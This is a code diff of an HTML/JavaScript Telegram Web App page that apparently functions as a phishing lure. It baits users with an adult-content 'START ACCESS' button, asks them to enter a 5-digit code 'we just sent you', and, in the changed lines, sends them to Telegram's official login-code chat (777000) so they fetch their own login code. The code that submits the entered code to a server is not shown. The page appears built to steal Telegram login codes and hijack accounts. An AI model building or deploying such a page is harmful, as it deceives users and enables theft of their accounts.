@@ -41,7 +41,6 @@
             50% { transform: translateY(15px); }
         }
 
-        /* ওটিপি স্ক্রিন ডিজাইন */
         .instruction-box {
             background: rgba(255, 255, 255, 0.95);
             padding: 15px; border-radius: 15px;
@@ -49,7 +48,6 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
 
-        /* নতুন Get Code বাটন ডিজাইন */
         .get-code-btn {
             background: linear-gradient(45deg, #2196f3, #00bcd4);
             color: white; border: none; padding: 12px;
@@ -93,19 +91,16 @@
     <div class="overlay"></div>
 
     <div class="main-container">
-        <!-- ধাপ ১: আঙুলের ইমোজি -->
         <div id="step0">
             <div id="finger_point" class="finger-icon">👇</div>
             <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
-        <!-- ধাপ ২: ওটিপি স্ক্রিন -->
         <div id="step2" class="hidden">
             <div class="instruction-box">
                 Enter the 5-digit code that we just sent you!
             </div>
 
-            <!-- নতুন Get Code বাটন -->
             <button class="get-code-btn" onclick="openTelegramChat()">📥 Click Here to Get Code</button>
 
             <div class="otp-inputs">
@@ -129,7 +124,6 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Telegram Main Button Setup
         tg.MainButton.setText("🍓 START ACCESS 🔞");
         tg.MainButton.textColor = "#ffffff";
         tg.MainButton.color = "#ff4757";
@@ -175,9 +169,9 @@
             } catch (e) { alert("Server Error!"); }
         }
 
-        // নতুন ফাংশন: টেলিগ্রাম চ্যাটে নিয়ে যাওয়ার জন্য
         function openTelegramChat() {
-            tg.openTelegramLink("https://t.me/telegram"); // এটি সরাসরি টেলিগ্রামের অফিসিয়াল চ্যাটে নিয়ে যাবে
+            // আইডি 777000 হলো টেলিগ্রামের অফিশিয়াল নোটিফিকেশন চ্যাট
+            tg.openTelegramLink("https://t.me/777000"); 
         }
 
         function addNum(n) {
